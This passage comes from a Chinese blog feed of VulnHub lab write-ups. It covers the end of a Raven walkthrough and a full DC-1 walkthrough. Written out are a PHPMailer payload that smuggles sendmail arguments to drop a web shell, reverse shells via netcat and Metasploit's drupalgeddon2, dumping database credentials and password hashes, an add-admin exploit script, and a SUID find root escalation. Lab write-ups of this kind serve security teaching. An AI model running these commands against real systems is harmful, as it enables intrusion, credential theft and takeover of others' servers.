?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/wzz.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure><p>在 kali 中运行 40974.py 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 40974.py</span> <br></code></pre></td></tr></table></figure><p>然后就会在靶机的网站根目录下生成一个 wzz.php 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ ls /var/www/html<br>about.html   contact.zip  elements.html  img         js    Security - Doc  team.html  wordpress<br>contact.php  css          fonts          index.html  scss  service.html    vendor     wzz.php<br>michael@Raven:~$ find / -name &quot;wzz.php&quot; 2&gt;/dev/null<br>/var/www/html/wzz.php<br></code></pre></td></tr></table></figure><p>kali 中监听 4444 端口，在浏览器中访问 <code>http://192.168.135.149/wzz.php</code> 文件。然后就 getshell 成功了。</p><blockquote><p>这种方法使用的前提是我们要知道网站的根路径，靶机的话一般就是/var/www/html</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>     <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.149] 57054<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure><p><strong>查看开放的端口号：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> netstat -antpl</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC：1</title>
    <link href="/2022/06/26/Penetration/Vulnhub/Part-1/0x04%20DC-1/"/>
    <url>/2022/06/26/Penetration/Vulnhub/Part-1/0x04%20DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="0x04-DC-1-vulnhub"><a href="#0x04-DC-1-vulnhub" class="headerlink" title="0x04 DC: 1~vulnhub"></a>0x04 DC: 1~vulnhub</h1><blockquote><p>靶机地址：<a href="https://www.vulnhub.com/entry/dc-1,292/">DC: 1 ~ VulnHub</a></p><p>环境信息：</p><ul><li>攻击机 IP：192.168.135.141</li><li>靶机 IP：192.168.135.147</li></ul></blockquote><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 03:34 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.00032s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.00036s latency).<br>Nmap scan report for 192.168.135.147<br>Host is up (0.0011s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.54 seconds<br></code></pre></td></tr></table></figure><p><strong>得到靶机 ip：192.168.135.147</strong></p><h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>简单的端口扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.147</span><br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-26 03:35 EDT<br>Nmap scan report for 192.168.135.147<br>Host is up (0.00090s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>56253/tcp open  unknown<br>MAC Address: 00:0C:29:87:9B:9D (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 3.80 seconds<br></code></pre></td></tr></table></figure><p><strong>全面扫描：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.147</span><br><br>80/tcp    open  http    Apache httpd 2.2.22 ((Debian))<br>|_http-generator: Drupal 7 (http://drupal.org)<br>| http-robots.txt: 36 disallowed entries (15 shown)<br>| /includes/ /misc/ /modules/ /profiles/ /scripts/ <br>| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt <br>| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt <br>|_/LICENSE.txt /MAINTAINERS.txt<br>|_http-server-header: Apache/2.2.22 (Debian)<br>|_http-title: Welcome to Drupal Site | Drupal Site<br><br></code></pre></td></tr></table></figure><p><strong>得到目标端口信息：</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>其他</th></tr></thead><tbody><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td>Drupal 7</td></tr><tr><td>111/tcp</td><td>open</td><td>rpcbind</td><td></td></tr><tr><td>56253/tcp</td><td>open</td><td>unknown</td></tr></tbody></table></div><h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p><p>查看，发现是个  Drupal 的登录页面。可以在 MSF 上根据 Drupal 漏洞脚本进行权限获取。</p><p><strong>111端口</strong></p><p>查看无果。</p><p><strong>56253端口</strong></p><p>查看无果。</p><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>打开msf：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfconsole</span><br>msf6 &gt;<br></code></pre></td></tr></table></figure><p>使用 <code>exploit/unix/webapp/drupal_drupalgeddon2</code> 模块，拿到网站权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2<br>[*] No payload configured, defaulting to php/meterpreter/reverse_tcp<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options<br><br>Module options (exploit/unix/webapp/drupal_drupalgeddon2):<br><br>   Name         Current Setting  Required  Description<br>   ----         ---------------  --------  -----------<br>   DUMP_OUTPUT  false            no        Dump payload command output<br>   PHP_FUNC     passthru         yes       PHP function to execute<br>   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT        80               yes       The target port (TCP)<br>   SSL          false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI    /                yes       Path to Drupal install<br>   VHOST                         no        HTTP server virtual host<br><br><br>Payload options (php/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic (PHP In-Memory)<br><br><br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set RHOST 192.168.135.147<br>RHOST =&gt; 192.168.135.147<br>msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Running automatic check (&quot;set AutoCheck false&quot; to disable)<br>[!] The service is running, but could not be validated.<br>[*] Sending stage (39282 bytes) to 192.168.135.147<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.147:41230) at 2022-06-26 04:42:52 -0400<br><br>meterpreter &gt; shell<br>Process 3432 created.<br>Channel 0 created.<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>www-data@DC-1:/var/www$ whoami<br>whoami<br>www-data<br>www-data@DC-1:/var/www$ id<br>id<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><blockquote><p><a href="https://www.jianshu.com/p/86b3c598a4c4">Vulnhub靶机渗透测试——DC-1 - 简书 (jianshu.com)</a></p></blockquote><h3 id="1、flags"><a href="#1、flags" class="headerlink" title="1、flags"></a>1、flags</h3><p>查看当前目录，发现 flag1.txt ，查看文件得到提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ ls<br>ls<br>COPYRIGHT.txt       LICENSE.txt      cron.php     misc        sites<br>INSTALL.mysql.txt   MAINTAINERS.txt  flag1.txt    modules     themes<br>INSTALL.pgsql.txt   README.txt       includes     profiles    update.php<br>INSTALL.sqlite.txt  UPGRADE.txt      index.php    robots.txt  web.config<br>INSTALL.txt         authorize.php    install.php  scripts     xmlrpc.php<br>www-data@DC-1:/var/www$ cat flag1.txt   <br>cat flag1.txt<br>Every good CMS needs a config file - and so do you.<br></code></pre></td></tr></table></figure><p>百度查到 Drupal 的默认配置文件为 <code>/var/www/sites/default/settings.php</code> 。</p><p><a href="https://www.iteye.com/blog/justcoding-1407697">drupal7的目录结构及术语 - Just Code - ITeye博客</a></p><p>查看 <code>./sites/default/settings.php</code> ，得到 flag2 和数据库账号密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ cd sites<br>cd sites<br>www-data@DC-1:/var/www/sites$ ls<br>ls<br>README.txt  all  default  example.sites.php<br>www-data@DC-1:/var/www/sites$ cd default<br>cd default<br>www-data@DC-1:/var/www/sites/default$ ls<br>ls<br>default.settings.php  files  settings.php<br>www-data@DC-1:/var/www/sites/default$ cat settings.php<br>cat settings.php<br>&lt;?php<br><br>/**<br> *<br> * flag2<br> * Brute force and dictionary attacks aren&#x27;t the<br> * only ways to gain access (and you WILL need access).<br> * What can you do with these credentials?<br> *<br> */<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash">databases = array (</span><br>  &#x27;default&#x27; =&gt; <br>  array (<br>    &#x27;default&#x27; =&gt; <br>    array (<br>      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,<br>      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,<br>      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,<br>      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,<br>      &#x27;port&#x27; =&gt; &#x27;&#x27;,<br>      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,<br>      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,<br>    ),<br>  ),<br>);<br></code></pre></td></tr></table></figure><p>登录数据库，查找有用信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www/sites/default$ mysql -udbuser -pR0ck3t<br>mysql -udbuser -pR0ck3t<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 34839<br>Server version: 5.5.60-0+deb7u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| drupaldb           |<br>+--------------------+<br>2 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use drupaldb</span><br>use drupaldb<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>show tables;<br>+-----------------------------+<br>| Tables_in_drupaldb          |<br>+-----------------------------+<br>| ......                      |<br>| users                       |<br>| ......                      |<br>| variable                    |<br>+-----------------------------+<br>80 rows in set (0.05 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span>        <br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>可以看到 admin 用户的密码被加密了的，但是我们可以想办法修改密码或新增一个 admin 权限的用户：</p><p><strong>方法一：</strong>修改 admin 用户的密码</p><blockquote><p>参考：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdrupalchina.cn%2Fnode%2F2128">忘记Drupal的管理员密码的解决办法</a></p></blockquote><p>使用 Drupal 对数据库的加密方法，生成一个新密码，然后把新的密码更新到 admin 用户；或者直接注册一个新用户，将其加密后的密码直接替换到 admin 用户。</p><p>加密脚本为： <code>/var/www/scripts/password-hash.sh</code> </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">ww-data@DC-1:/var/www$ php scripts/password-hash.sh 123  <br>php scripts/password-hash.sh 123<br><br>password: 123           hash: $S$DKq7UGmp4iVzRUkizvlJH1h2.U6cOytmml9/ow7/SrAqUTsLqY46<br><br></code></pre></td></tr></table></figure><p>替换 admin 的密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span><br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> update users <span class="hljs-built_in">set</span> pass=<span class="hljs-string">&quot;$S<span class="hljs-variable">$DKq7UGmp4iVzRUkizvlJH1h2</span>.U6cOytmml9/ow7/SrAqUTsLqY46&quot;</span> <span class="hljs-built_in">where</span> name=<span class="hljs-string">&quot;admin&quot;</span>;</span><br>&lt;H1h2.U6cOytmml9/ow7/SrAqUTsLqY46&quot; where name=&quot;admin&quot;;                       <br>Query OK, 1 row affected (0.00 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select name,pass from users;</span><br>select name,pass from users;<br>+---------------------+---------------------------------------------------------+<br>| name                | pass                                                    |<br>+---------------------+---------------------------------------------------------+<br>| admin               | $S$DKq7UGmp4iVzRUkizvlJH1h2.U6cOytmml9/ow7/SrAqUTsLqY46 |<br>| Fred                | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |<br>| crawlergo@gmail.com | $S$DpPx0Vh5tAyL9HA9HnThsFUIDl2RWa6qNxi4lVWmvcga3xtltPxb |<br>+---------------------+---------------------------------------------------------+<br>4 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p><strong>方法二：</strong>新增一个 admin 权限的用户</p><p>在 exploitdb 中有一个针对 Drupal 7 版本的攻击脚本，可以增加一个 admin 权限的用户账号</p><p>查看 Drupal 版本,确定 Drupal 版本为7.24</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ cat /var/www/includes/bootstrap.inc | grep VERSION<br></code></pre></td></tr></table></figure><p>查找利用脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit drupal<br></code></pre></td></tr></table></figure><p>攻击脚本适用于 7.31 以下，所以适合 7.24 版本，可以利用漏洞增加 admin 权限用户，增加有 admin 权限的用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.135.147 -u admin1 -p admin1<br></code></pre></td></tr></table></figure><p>成功登录，在 <code>Find content</code> 里找到 <code>flag3</code> ，查看得到提示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">flag3<br>Special PERMS will <span class="hljs-built_in">help</span> FIND the passwd - but yo<span class="hljs-string">u&#x27;ll need to -exec that command to work out how to get what&#x27;</span>s <span class="hljs-keyword">in</span> the shadow.<br></code></pre></td></tr></table></figure><p>查看 <code>/etc/passwd</code> ，得知有个用户为 flag4，在其目录下找到 flag4.txt ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/var/www$ cat /etc/passwd<br>cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>......<br>mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false<br>flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash<br>www-data@DC-1:/var/www$ cd /home/flag4<br>cd /home/flag4<br>www-data@DC-1:/home/flag4$ ls<br>ls<br>flag4.txt<br>www-data@DC-1:/home/flag4$ cat flag4.txt<br>cat flag4.txt<br>Can you use this same method to find or access the flag in root?<br><br>Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?<br></code></pre></td></tr></table></figure><p>根据提示，猜测 <code>/root</code> 目录下应该也有个 flag ，查找发现 <code>/root/thefinalflag.txt</code> ，查看权限不够。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@DC-1:/home/flag4$ find /root<br>find /root<br>/root<br>/root/.profile<br>/root/.drush<br>/root/.drush/drush.complete.sh<br>......<br>/root/thefinalflag.txt<br>/root/.bash_history<br>/root/.bashrc<br>/root/.aptitude<br>/root/.aptitude/config<br>www-data@DC-1:/var/www$ cat /root/thefinalflag.txt<br>cat /root/thefinalflag.txt<br>cat: /root/thefinalflag.txt: Permission denied<br></code></pre></td></tr></table></figure><h3 id="2、SUID提权"><a href="#2、SUID提权" class="headerlink" title="2、SUID提权"></a>2、SUID提权</h3><blockquote><p><a href="https://www.jianshu.com/p/5ac4602b14c6">linux 提权-SUID提权 - 简书 (jianshu.com)</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/84872644">(4条消息) Linux下用SUID提权_谢公子的博客-CSDN博客 suid提权</a></p></blockquote><p><strong>什么是SUID？</strong></p><p>SUID (Set UID) 是Linux中的一种特殊权限,其功能为用户运行某个程序时，如果该程序有SUID权限，那么程序运行为进程时，进程的属主不是发起者，而是程序文件所属的属主。但是SUID权限的设置只针对二进制可执行文件,对于非可执行文件设置SUID没有任何意义。</p><p>在执行过程中，调用者会暂时获得该文件的所有者权限,且该权限只在程序执行的过程中有效. 通俗的来讲,假设我们现在有一个可执行文件ls,其属主为root,当我们通过非root用户登录时,如果ls设置了SUID权限,我们可在非root用户下运行该二进制可执行文件,在执行文件时,该进程的权限将为root权限。</p><p><img src="https://img-blog.csdnimg.cn/a21acef9394946e684c2f109744486a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBASWVya2VV,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p><strong>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找具有root权限的SUID的文件</span><br><span class="hljs-meta">#</span><span class="bash"> 可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</span><br>www-data@DC-1:/home/flag4$ find / -perm -u=s -type f 2&gt;/dev/null<br><br>www-data@DC-1:/home/flag4$ ls -al /usr/bin/find<br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查找根目录下名为 thefinalflag.txt 的文件并执行 shell</span><br><span class="hljs-meta">#</span><span class="bash"> -<span class="hljs-built_in">exec</span> 参数后面跟的是<span class="hljs-built_in">command</span>命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。</span><br>www-data@DC-1:/var/www$ find / -name thefinalflag.txt -exec &quot;/bin/sh&quot; \;    <br>find / -name thefinalflag.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>id<br>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br><span class="hljs-meta">#</span><span class="bash"> cat /root/thefinalflag.txt</span>                                <br>cat /root/thefinalflag.txt<br>Well done!!!!<br><br>Hopefully you&#x27;ve enjoyed this and learned some new skills.<br><br>You can let me know what you thought of this little journey<br>by contacting me via Twitter - @DCAU7<br><span class="hljs-meta">#</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、CMS：Drupal 7 